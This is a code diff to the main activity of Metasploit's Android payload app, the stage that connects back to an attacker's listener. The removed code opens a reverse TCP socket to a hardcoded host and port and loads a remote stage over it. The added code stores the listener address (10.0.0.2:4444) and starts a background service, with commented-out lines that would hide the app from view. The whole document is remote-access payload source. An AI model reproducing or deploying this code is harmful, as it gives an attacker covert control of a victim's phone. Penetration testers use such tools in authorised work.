@@ -1,59 +1,56 @@
 package com.metasploit.stage;
 
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
-import java.io.OutputStream;
-import java.net.Socket;
-
 import android.app.Activity;
-import android.os.AsyncTask;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.view.View;
-import android.view.View.OnClickListener;
+import android.widget.Button;
 
 public class MainActivity extends Activity
 {
-    // avoid re-ordering the strings in classes.dex - append XXXX
-    private static final String LHOST = "XXXX127.0.0.1                       ";
-    private static final String LPORT = "YYYY4444                            ";
-	
+	 // avoid re-ordering the strings in classes.dex - append XXXX
+    public static final String LHOST = "XXXX10.0.0.2                       ";
+    public static final String LPORT = "YYYY4444                            "; 
+    
+    private Intent ServiceIntent;
+    
     @Override
     public void onCreate(Bundle savedInstanceState)
     {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
 
-        findViewById(R.id.button_reverse).setOnClickListener(new OnClickListener() {
+        SharedPreferences prefs = this.getSharedPreferences("com.metasploit.stage", Context.MODE_PRIVATE);
+        prefs.edit().putString("LHOST", LHOST).commit();
+        prefs.edit().putString("LPORT", LPORT).commit();
+        
+        ServiceIntent = new Intent(getApplicationContext(), StageService.class);
+        
+        Button button1 = (Button) findViewById(R.id.button2);
+        button1.setOnClickListener(new View.OnClickListener() {
             @Override
-            public void onClick(View v) {
-                startAsync();
+            public void onClick(View view) {
+            	startService(ServiceIntent);
             }
         });
-
-        startAsync();
-    }
-
-    private void startAsync() {
-        new AsyncTask<Void, Void, Void>() {
+        
+        Button button2 = (Button) findViewById(R.id.button1);
+        button2.setOnClickListener(new View.OnClickListener() {
             @Override
-            protected Void doInBackground(Void... params) {
-                reverseTCP();
-                return null;
+            public void onClick(View view) {
+            	stopService(ServiceIntent);
             }
-        }.execute();
+        });
+        
+        //moveTaskToBack(true);
     }
+	
+	@Override
+	protected void onResume() {
+		super.onResume();
+		//moveTaskToBack(true);
+	}
 
-    private void reverseTCP() {
-        try {
-            String lhost = LHOST.substring(4).trim();
-            String lport = LPORT.substring(4).trim();
-            Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
-            DataInputStream in = new DataInputStream(msgsock.getInputStream());
-            OutputStream out = new DataOutputStream(msgsock.getOutputStream());
-            new LoadStage().start(in, out, this, new String[] {});
-            msgsock.close();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
 }
